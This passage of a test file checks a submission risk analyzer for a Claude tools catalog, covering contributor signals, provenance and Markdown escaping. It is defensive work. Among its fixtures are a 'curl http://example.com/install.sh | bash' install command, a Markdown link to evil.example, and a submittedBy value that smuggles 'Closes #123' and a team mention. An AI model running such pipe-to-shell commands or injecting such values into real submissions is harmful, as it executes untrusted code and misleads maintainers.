    expect(markdown).not.toContain("&#64;");
    expect(markdown).not.toContain("&#35;");
    expect(markdown).not.toContain("@&Analyze");

    const malformedIssue = {
      ...issue(body),
      user: {
        login: "&Analyze user profile system implementation #64;zjg678",
      },
      author: {
        login: "&Analyze user profile system implementation #64;zjg678",
      },
    };
    const malformed = analyzeIssueSubmissionRisk(
      malformedIssue,
      validateSubmission(malformedIssue),
      {
        contributor: {
          login: "&Analyze user profile system implementation #64;zjg678",
        },
      },
    );
    const malformedMarkdown = formatSubmissionRiskMarkdown(malformed);

    expect(malformed.effectiveContributor).toBeNull();
    expect(malformed.contributorAnalysis.resolutionStatus).toBe("unresolved");
    expect(malformedMarkdown).toContain(
      "`&Analyze user profile system implementation #64;zjg678`",
    );
    expect(malformedMarkdown).not.toContain("@zjg678");
  });

  it("captures structured contributor states for maintainer review", () => {
    const body = buildSubmissionIssueDraft({
      name: "Contributor State MCP",
      slug: "contributor-state-mcp",
      category: "mcp",
      docs_url: "https://example.com/docs",
      description: "MCP server for contributor analysis coverage.",
      card_description: "Contributor analysis coverage.",
      install_command: "npx -y contributor-state-mcp",
      usage_snippet:
        "claude mcp add contributor-state-mcp -- npx -y contributor-state-mcp",
    }).body;
    const baseIssue = issue(body);
    const newReport = analyzeIssueSubmissionRisk(
      baseIssue,
      validateSubmission(baseIssue),
      {
        contributor: {
          login: "new-user",
          created_at: new Date().toISOString(),
          public_repos: 0,
        },
      },
    );
    const youngReport = analyzeIssueSubmissionRisk(
      baseIssue,
      validateSubmission(baseIssue),
      {
        contributor: {
          login: "young-user",
          created_at: new Date(Date.now() - 14 * 86_400_000).toISOString(),
          public_repos: 1,
        },
      },
    );
    const establishedBotReport = analyzeIssueSubmissionRisk(
      baseIssue,
      validateSubmission(baseIssue),
      {
        contributor: {
          login: "dependabot[bot]",
          type: "Bot",
          created_at: "2018-01-01T00:00:00Z",
          public_repos: 12,
        },
      },
    );

    expect(newReport.reviewFlags.map((flag) => flag.id)).toContain(
      "new_contributor_account",
    );
    expect(newReport.contributorAnalysis.reviewSignals).toEqual(
      expect.arrayContaining(["new_account", "no_public_repositories"]),
    );
    expect(youngReport.reviewFlags.map((flag) => flag.id)).toContain(
      "young_contributor_account",
    );
    expect(youngReport.contributorAnalysis.reviewSignals).toContain(
      "young_account",
    );
    expect(establishedBotReport.contributorAnalysis.reviewSignals).toEqual(
      expect.arrayContaining(["bot_account", "established_account"]),
    );
  });

  it("warns when direct PR product listings are outside content/tools", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 327,
        title: "Add MultipleChat listing",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/327",
        user: { login: "multiplechat" },
      },
      files: [
        {
          filename: "content/agents/multiplechat.mdx",
          status: "added",
          content: `---
title: MultipleChat
slug: multiplechat
category: agents
description: Hosted SaaS product for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface.
cardDescription: Multi-model AI workspace for verified answers.
submittedBy: multiplechat
submittedByUrl: https://github.com/multiplechat
websiteUrl: https://multiplechat.ai/
documentationUrl: https://multiplechat.ai/features
pricingModel: freemium
disclosure: editorial
applicationCategory: WebApplication
operatingSystem: Web
---
## Overview
Free to try with no credit card. Includes document, presentation, Excel, and image tools in one subscription.`,
        },
      ],
    });

    expect(report.riskTier).toBe("low");
    expect(report.classificationWarnings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "tools_category_routing" }),
      ]),
    );
    expect(formatSubmissionRiskMarkdown(report)).toContain(
      "Classification warnings",
    );
  });

  it("accepts direct PR tools listings with required review metadata", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 328,
        title: "Add MultipleChat tools listing",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/328",
        user: { login: "multiplechat" },
      },
      files: [
        {
          filename: "content/tools/multiplechat.mdx",
          status: "added",
          content: `---
title: MultipleChat
slug: multiplechat
category: tools
description: Hosted multi-model AI workspace for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface.
cardDescription: Multi-model AI workspace for verified answers.
submittedBy: multiplechat
submittedByUrl: https://github.com/multiplechat
websiteUrl: https://multiplechat.ai/
documentationUrl: https://multiplechat.ai/features
pricingModel: freemium
disclosure: editorial
applicationCategory: WebApplication
operatingSystem: Web
---
## Editorial notes
Review source claims and screenshots before publishing.`,
        },
      ],
    });

    expect(report.riskTier).toBe("low");
    expect(report.classificationWarnings).toEqual([]);
  });

  it("warns when direct content PRs include generated README changes", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 329,
        title: "Add Example MCP listing",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/329",
        user: { login: "contributor" },
      },
      files: [
        {
          filename: "content/mcp/example-mcp.mdx",
          status: "added",
          content: `---
title: Example MCP
slug: example-mcp
category: mcp
description: MCP server for testing generated README guidance.
submittedBy: contributor
submittedByUrl: https://github.com/contributor
repoUrl: https://github.com/example/example-mcp
documentationUrl: https://example.com/docs
installCommand: "npx -y example-mcp"
usageSnippet: "claude mcp add example-mcp -- npx -y example-mcp"
---
## Usage
Run the install command.`,
        },
        {
          filename: "README.md",
          status: "modified",
          content: "# HeyClaude\n\nManual catalog update.",
        },
      ],
    });

    expect(report.classificationWarnings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "generated_readme_change" }),
      ]),
    );
    expect(report.contributionAnalysis.capabilityRiskBuckets).toContain(
      "classification_review",
    );
    expect(report.contributionAnalysis.maintainerActionItems).toContain(
      "Confirm this belongs in the submitted category.",
    );
    expect(formatSubmissionRiskMarkdown(report)).toContain(
      "README\\.md changes are not accepted in direct content PRs",
    );
  });

  it("captures multiple content files and GitHub source metadata when provided", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 332,
        title: "Add Example MCP listings",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/332",
        user: { login: "source-owner" },
      },
      contributor: {
        login: "source-owner",
        html_url: "https://github.com/source-owner",
        created_at: "2020-01-01T00:00:00Z",
        public_repos: 3,
      },
      githubSourceRepositories: [
        {
          full_name: "source-owner/example-one",
          html_url: "https://github.com/source-owner/example-one",
          default_branch: "main",
          visibility: "public",
          stargazers_count: 42,
          forks_count: 5,
        },
      ],
      files: [
        {
          filename: "content/mcp/example-one.mdx",
          status: "added",
          content: `---
title: Example One
slug: example-one
category: mcp
description: Example MCP server with repository metadata.
submittedBy: source-owner
submittedByUrl: https://github.com/source-owner
repoUrl: https://github.com/source-owner/example-one
documentationUrl: https://example.com/one/docs
installCommand: "npx -y example-one"
usageSnippet: "claude mcp add example-one -- npx -y example-one"
---
## Usage
Run the install command.`,
        },
        {
          filename: "content/mcp/example-two.mdx",
          status: "added",
          content: `---
title: Example Two
slug: example-two
category: mcp
description: Second Example MCP server in the same PR.
submittedBy: source-owner
submittedByUrl: https://github.com/source-owner
documentationUrl: https://example.com/two/docs
installCommand: "npx -y example-two"
usageSnippet: "claude mcp add example-two -- npx -y example-two"
---
## Usage
Run the install command.`,
        },
      ],
    });

    expect(report.contributionAnalysis.contentFiles).toHaveLength(2);
    expect(report.contributionAnalysis.githubSourceRepos).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          fullName: "source-owner/example-one",
          stargazersCount: 42,
        }),
      ]),
    );
    expect(formatSubmissionRiskMarkdown(report)).toContain("GitHub sources");
  });

  it("falls back to sourceRepositories when GitHub source repositories are empty", () => {
    const body = buildSubmissionIssueDraft({
      name: "Fallback Source MCP",
      slug: "fallback-source-mcp",
      category: "mcp",
      docs_url: "https://example.com/docs",
      description: "MCP server with fallback repository metadata.",
      card_description: "Fallback repository metadata.",
      install_command: "npx -y fallback-source-mcp",
      usage_snippet:
        "claude mcp add fallback-source-mcp -- npx -y fallback-source-mcp",
    }).body;
    const submissionIssue = issue(body);
    const issueReport = analyzeIssueSubmissionRisk(
      submissionIssue,
      validateSubmission(submissionIssue),
      {
        githubSourceRepositories: [],
        sourceRepositories: [
          {
            full_name: "fallback/issue-source",
            stargazers_count: 9,
          },
        ],
      },
    );
    const directReport = analyzeDirectContentRisk({
      sourceType: "external_direct",
      githubSourceRepositories: [],
      sourceRepositories: [
        {
          full_name: "fallback/direct-source",
          stargazers_count: 12,
        },
      ],
      pullRequest: {
        number: 333,
        title: "Add Fallback Source MCP",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/333",
        user: { login: "fallback-user" },
      },
      files: [
        {
          filename: "content/mcp/fallback-source-mcp.mdx",
          status: "added",
          content: `---
title: Fallback Source MCP
slug: fallback-source-mcp
category: mcp
description: MCP server with fallback source metadata.
submittedBy: fallback-user
submittedByUrl: https://github.com/fallback-user
documentationUrl: https://example.com/docs
installCommand: "npx -y fallback-source-mcp"
usageSnippet: "claude mcp add fallback-source-mcp -- npx -y fallback-source-mcp"
---
## Usage
Run the install command.`,
        },
      ],
    });

    expect(issueReport.contributionAnalysis.githubSourceRepos).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          fullName: "fallback/issue-source",
          stargazersCount: 9,
        }),
      ]),
    );
    expect(directReport.contributionAnalysis.githubSourceRepos).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          fullName: "fallback/direct-source",
          stargazersCount: 12,
        }),
      ]),
    );
  });

  it("preserves richer PR actor metadata for direct contributor analysis", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 334,
        title: "Add Rich Actor MCP",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/334",
        user: { login: "rich-actor" },
      },
      pullRequestActor: {
        login: "rich-actor",
        html_url: "https://github.com/rich-actor",
        created_at: "2021-01-01T00:00:00Z",
        public_repos: 7,
      },
      files: [
        {
          filename: "content/mcp/rich-actor-mcp.mdx",
          status: "added",
          content: `---
title: Rich Actor MCP
slug: rich-actor-mcp
category: mcp
description: MCP server submitted by a direct PR actor.
submittedBy: rich-actor
submittedByUrl: https://github.com/rich-actor
documentationUrl: https://example.com/docs
installCommand: "npx -y rich-actor-mcp"
usageSnippet: "claude mcp add rich-actor-mcp -- npx -y rich-actor-mcp"
---
## Usage
Run the install command.`,
        },
      ],
    });

    expect(report.provenanceStatus).toBe("passed");
    expect(report.effectiveContributor?.login).toBe("rich-actor");
    expect(report.contributorSource).toBe("pull_request_actor");
    expect(report.contributorAnalysis).toMatchObject({
      login: "rich-actor",
      source: "pull_request_actor",
      publicRepos: 7,
    });
    expect(report.contributorAnalysis.reviewSignals).toContain(
      "established_account",
    );
  });

  it("attributes automation import PR risk to the original issue submitter", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "automation_import",
      pullRequest: {
        number: 337,
        title: "feat(content): add mcp memesio-mcp-server",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/337",
        user: { login: "github-actions[bot]" },
        head: {
          ref: "automation/submission-325-memesio-mcp-server",
          repo: { full_name: "JSONbored/awesome-claude" },
        },
      },
      pullRequestActor: {
        login: "github-actions[bot]",
        created_at: "2018-07-30T09:30:17Z",
      },
      contributor: {
        login: "github-actions[bot]",
        created_at: "2018-07-30T09:30:17Z",
      },
      submissionIssueContributors: [
        {
          issueNumber: 325,
          issue: { number: 325, user: { login: "vy35" } },
          contributor: {
            login: "vy35",
            html_url: "https://github.com/vy35",
            created_at: "2020-01-01T00:00:00Z",
            public_repos: 4,
          },
        },
      ],
      files: [
        {
          filename: "content/mcp/memesio-mcp-server.mdx",
          status: "added",
          content: `---
title: Memesio MCP Server
slug: memesio-mcp-server
category: mcp
description: Hosted meme generation MCP server that requires API credentials.
submittedBy: vy35
submittedByUrl: https://github.com/vy35
submissionIssueNumber: 325
submissionIssueUrl: https://github.com/JSONbored/awesome-claude/issues/325
documentationUrl: https://memesio.com/developers/mcp
brandDomain: memesio.com
installCommand: "npx -y mcp-remote https://memesio.com/mcp --header x-api-key:\${MEMESIO_API_KEY}"
usageSnippet: "Use an API key to generate memes."
---
## Usage
Run the install command.`,
        },
        {
          filename: "README.md",
          status: "modified",
          content: "# HeyClaude\n\nGenerated catalog update.",
        },
      ],
    });

    const markdown = formatSubmissionRiskMarkdown(report);

    expect(report.provenanceStatus).toBe("passed");
    expect(report.effectiveContributor?.login).toBe("vy35");
    expect(report.pullRequestActor?.login).toBe("github-actions[bot]");
    expect(report.contributorSource).toBe("submission_issue_author");
    expect(report.trustSignals).toEqual(
      expect.arrayContaining([
        "PR opened by: @github-actions[bot]",
        "Submission issue: #325",
      ]),
    );
    expect(report.trustSignals).not.toContain("Contributor analyzed: @vy35");
    expect(report.classificationWarnings).not.toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "generated_readme_change" }),
      ]),
    );
    expect(markdown).toContain("Contributor analyzed: @vy35");
    expect(markdown).toContain("PR opened by: @github-actions[bot]");
    expect(markdown).toContain(
      "`content/mcp/memesio-mcp-server.mdx`: by @vy35 via issue #325",
    );
  });

  it("does not attribute unresolved automation imports to the PR actor", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "automation_import",
      pullRequest: {
        number: 343,
        title: "feat(content): add mcp unresolved-import",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/343",
        user: { login: "github-actions[bot]" },
      },
      pullRequestActor: {
        login: "github-actions[bot]",
        created_at: "2018-07-30T09:30:17Z",
      },
      submissionIssueContributors: [
        {
          issueNumber: 343,
          issue: null,
          contributor: null,
          error: "not found",
        },
      ],
      files: [
        {
          filename: "content/mcp/unresolved-import.mdx",
          status: "added",
          content: `---
title: Unresolved Import
slug: unresolved-import
category: mcp
description: Imported MCP server with unresolved issue contributor metadata.
submittedBy: original-submitter
submittedByUrl: https://github.com/original-submitter
submissionIssueNumber: 343
submissionIssueUrl: https://github.com/JSONbored/awesome-claude/issues/343
documentationUrl: https://example.com/docs
installCommand: "npx -y unresolved-import"
usageSnippet: "claude mcp add unresolved-import -- npx -y unresolved-import"
---
## Usage
Run the install command.`,
        },
      ],
    });
    const markdown = formatSubmissionRiskMarkdown(report);

    expect(report.provenanceStatus).toBe("failed");
    expect(report.effectiveContributor).toBeNull();
    expect(report.contributorSource).toBe("submission_issue_author");
    expect(report.contributorAnalysis).toMatchObject({
      login: "",
      source: "submission_issue_author",
      resolutionStatus: "unresolved",
    });
    expect(report.contributorAnalysis.reviewSignals).toContain(
      "identity_unresolved",
    );
    expect(report.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "missing_issue_contributor_343",
          blocking: true,
        }),
      ]),
    );
    expect(report.trustSignals).not.toContain(
      "Contributor analyzed: @github-actions[bot]",
    );
    expect(markdown).not.toContain(
      "Contributor analyzed: @github-actions[bot]",
    );
  });

  it("uses content frontmatter provenance for same-repo maintainer PRs", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "same_repo_direct",
      pullRequest: {
        number: 342,
        title: "fix(submission): attribute PR risk to original submitters",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/342",
        user: { login: "JSONbored" },
      },
      pullRequestActor: {
        login: "JSONbored",
        html_url: "https://github.com/JSONbored",
        created_at: "2019-05-01T00:00:00Z",
      },
      contributor: {
        login: "JSONbored",
        html_url: "https://github.com/JSONbored",
      },
      frontmatterContributors: [
        {
          login: "kriptoburak",
          html_url: "https://github.com/kriptoburak",
          created_at: "2014-09-12T23:53:37Z",
          public_repos: 313,
        },
      ],
      files: [
        {
          filename: "content/mcp/xquik-mcp-server.mdx",
          status: "modified",
          content: `---
title: Xquik MCP Server
slug: xquik-mcp-server
category: mcp
description: Remote MCP server for X and Twitter automation, tweet search, webhooks, and confirmation-gated posting.
submittedBy: kriptoburak
submittedByUrl: https://github.com/kriptoburak
importPrNumber: 326
importPrUrl: https://github.com/JSONbored/awesome-claude/pull/326
repoUrl: https://github.com/Xquik-dev/x-twitter-scraper
documentationUrl: https://docs.xquik.com/mcp/overview
installCommand: "npx -y mcp-remote@0.1.38 https://xquik.com/mcp --header x-api-key:\${XQUIK_API_KEY}"
usageSnippet: "Use an API key for Xquik social media posting workflows."
---
## Security Notes
Review payloads before posting tweets, replies, DMs, or profile updates.`,
        },
        {
          filename: "README.md",
          status: "modified",
          content: "# HeyClaude\n\nGenerated catalog update.",
        },
      ],
    });

    const markdown = formatSubmissionRiskMarkdown(report);

    expect(report.provenanceStatus).toBe("passed");
    expect(report.effectiveContributor?.login).toBe("kriptoburak");
    expect(report.pullRequestActor?.login).toBe("JSONbored");
    expect(report.contributorSource).toBe("content_frontmatter");
    expect(report.trustSignals).toEqual(
      expect.arrayContaining(["PR opened by: @JSONbored"]),
    );
    expect(report.trustSignals).not.toContain(
      "Contributor analyzed: @kriptoburak",
    );
    expect(report.classificationWarnings).not.toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "generated_readme_change" }),
      ]),
    );
    expect(markdown).toContain("Contributor analyzed: @kriptoburak");
    expect(markdown).toContain("PR opened by: @JSONbored");
    expect(markdown).toContain(
      "`content/mcp/xquik-mcp-server.mdx`: by @kriptoburak via PR #326",
    );
  });

  it("fails automation import provenance when content submitter does not match the issue author", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "automation_import",
      pullRequest: {
        number: 338,
        title: "feat(content): add mcp example",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/338",
        user: { login: "github-actions[bot]" },
      },
      pullRequestActor: { login: "github-actions[bot]" },
      submissionIssueContributors: [
        {
          issueNumber: 324,
          issue: { number: 324, user: { login: "vy35" } },
          contributor: { login: "vy35", html_url: "https://github.com/vy35" },
        },
      ],
      files: [
        {
          filename: "content/mcp/example-import.mdx",
          status: "added",
          content: `---
title: Example Import
slug: example-import
category: mcp
description: Example imported MCP server.
submittedBy: someone-else
submittedByUrl: https://github.com/someone-else
submissionIssueNumber: 324
submissionIssueUrl: https://github.com/JSONbored/awesome-claude/issues/324
documentationUrl: https://example.com/docs
installCommand: "npx -y example-import"
usageSnippet: "claude mcp add example-import -- npx -y example-import"
---
## Usage
Run the install command.`,
        },
      ],
    });

    expect(report.provenanceStatus).toBe("failed");
    expect(report.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "import_submitter_mismatch_content/mcp/example-import.mdx",
          blocking: true,
        }),
      ]),
    );
    expect(report.contributionAnalysis.provenanceState).toBe("failed");
    expect(report.contributionAnalysis.capabilityRiskBuckets).toContain(
      "provenance_review",
    );
  });

  it("fails external direct content PRs without submitter provenance", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 330,
        title: "Add Example MCP listing",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/330",
        user: { login: "contributor" },
      },
      files: [
        {
          filename: "content/mcp/no-provenance.mdx",
          status: "added",
          content: `---
title: No Provenance MCP
slug: no-provenance
category: mcp
description: Example MCP server without submitter provenance.
documentationUrl: https://example.com/docs
installCommand: "npx -y no-provenance"
usageSnippet: "claude mcp add no-provenance -- npx -y no-provenance"
---
## Usage
Run the install command.`,
        },
      ],
    });

    expect(report.provenanceStatus).toBe("failed");
    expect(report.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "missing_direct_pr_submitter_content/mcp/no-provenance.mdx",
          blocking: true,
        }),
      ]),
    );
  });

  it("fails external direct content PRs when submittedBy differs from the PR author", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 331,
        title: "Add Example MCP listing",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/331",
        user: { login: "contributor" },
      },
      files: [
        {
          filename: "content/mcp/wrong-provenance.mdx",
          status: "added",
          content: `---
title: Wrong Provenance MCP
slug: wrong-provenance
category: mcp
description: Example MCP server with mismatched submitter provenance.
submittedBy: someone-else
submittedByUrl: https://github.com/someone-else
documentationUrl: https://example.com/docs
installCommand: "npx -y wrong-provenance"
usageSnippet: "claude mcp add wrong-provenance -- npx -y wrong-provenance"
---
## Usage
Run the install command.`,
        },
      ],
    });

    expect(report.provenanceStatus).toBe("failed");
    expect(report.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "direct_pr_submitter_mismatch_content/mcp/wrong-provenance.mdx",
          blocking: true,
        }),
      ]),
    );
    expect(report.contributionAnalysis.maintainerActionItems).toContain(
      "Resolve provenance blockers before merge.",
    );
  });

  it("collects source URLs without regex backtracking on punctuation-heavy text", () => {
    const report = analyzeDirectContentRisk({
      files: [
        {
          filename: "content/mcp/punctuation-heavy-source.mdx",
          status: "added",
          content: `---
title: Punctuation Heavy Source
slug: punctuation-heavy-source
category: mcp
description: Test entry with an inline source URL.
---
Review the canonical docs at https://example.com/docs${",".repeat(20_000)}
and keep scanning bounded.`,
        },
      ],
    });

    expect(report.sourceUrls).toContain("https://example.com/docs");
    expect(report.sourceUrls).not.toContain(
      `https://example.com/docs${",".repeat(20_000)}`,
    );
  });

  it("renders untrusted risk details as inert Markdown in bot comments", () => {
    const maliciousIssue = issue(`### Name
Malicious Source MCP

### Slug
malicious-source-mcp

### Category
mcp

### GitHub URL
[maintainer approval](https://evil.example) @octocat #123

### Description
MCP server with malicious source markdown in the URL field.

### Card description
Malicious source markdown coverage.

### Install command
npx -y malicious-source-mcp

### Usage snippet
claude mcp add malicious-source-mcp -- npx -y malicious-source-mcp`);

    const report = analyzeIssueSubmissionRisk(
      maliciousIssue,
      validateSubmission(maliciousIssue),
    );
    const markdown = formatSubmissionRiskMarkdown(report);

    expect(markdown).toContain(
      "`[maintainer approval](https://evil.example) @octocat #123`",
    );
    expect(markdown).not.toContain("- [maintainer approval]");
    expect(markdown).not.toContain(" - @octocat");

    const trustMarkdown = formatSubmissionRiskMarkdown({
      ...report,
      trustSignals: ["Reference bait: word#123 @octocat"],
    });
    expect(trustMarkdown).toContain("- Reference bait: `word#123 @octocat`");
    expect(trustMarkdown).not.toContain("&#35;");
    expect(trustMarkdown).not.toContain("&\\#35;");
    expect(trustMarkdown).not.toContain("&#64;");
    expect(trustMarkdown).not.toContain("&\\#64;");
  });

  it("rejects non-GitHub submittedBy provenance in content metadata", () => {
    const result = validateEntry("mcp", {
      title: "Injected Submitter MCP",
      slug: "injected-submitter-mcp",
      description:
        "MCP server metadata fixture for validating submittedBy provenance constraints.",
      documentationUrl: "https://example.com/docs",
      installCommand: "npx -y injected-submitter-mcp",
      usageSnippet:
        "claude mcp add injected-submitter-mcp -- npx -y injected-submitter-mcp",
      submittedBy: "attacker\n\nCloses #123\n@octo-org/security-team",
    });

    expect(result.semanticErrors).toContain(
      "submittedBy must be a GitHub username",
    );

    const botResult = validateEntry("mcp", {
      title: "Bot Submitter MCP",
      slug: "bot-submitter-mcp",
      description:
        "MCP server metadata fixture for validating bot submittedBy provenance constraints.",
      documentationUrl: "https://example.com/docs",
      installCommand: "npx -y bot-submitter-mcp",
      usageSnippet:
        "claude mcp add bot-submitter-mcp -- npx -y bot-submitter-mcp",
      submittedBy: "dependabot[bot]",
    });
    expect(botResult.semanticErrors).not.toContain(
      "submittedBy must be a GitHub username",
    );
  });

  it("blocks obviously unsafe submissions without treating category or legal domain as risk", () => {
    const legalIssue = issue(`### Name
Legal Research Helper

### Slug
legal-research-helper

### Category
mcp

### Docs URL
https://example.com/legal

### Description
Legal research helper for public court records.

### Card description
Public legal research helper.`);
    const legalReport = analyzeIssueSubmissionRisk(
      legalIssue,
      validateSubmission(legalIssue),
    );
    expect(legalReport.reviewFlags.map((flag) => flag.id)).not.toContain(
      "regulated_domain",
    );

    const malwareIssue = issue(`### Name
Credential Dumper

### Slug
credential-dumper

### Category
mcp

### Docs URL
https://example.com/mcp

### Description
This tool can dump browser session tokens and steal wallet credentials.

### Card description
Credential extraction workflow.

### Install command
curl http://example.com/install.sh | bash`);
    const malwareReport = analyzeIssueSubmissionRisk(
      malwareIssue,
      validateSubmission(malwareIssue),
    );

    expect(malwareReport.riskTier).toBe("critical");
    expect(malwareReport.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "malicious_data_theft_capability",
        "non_https_executable_source",
        "unsafe_install_pipeline",
      ]),
    );
  });

  it("parses unstructured issue bodies into canonical fields", () => {
    const fields = parseIssueFormBody(`## Submission

**Name:** Macuse
**Website:** https://macuse.app
**GitHub:** https://github.com/macuseapp/macuse
**Category:** macOS Automation / MCP Server

### Description
Native macOS MCP server.`);
    expect(fields.name).toBe("Macuse");
    expect(fields.category).toBe("mcp");
    expect(fields.github_url).toBe("https://github.com/macuseapp/macuse");
    expect(fields.docs_url).toBe("https://macuse.app");
  });
});
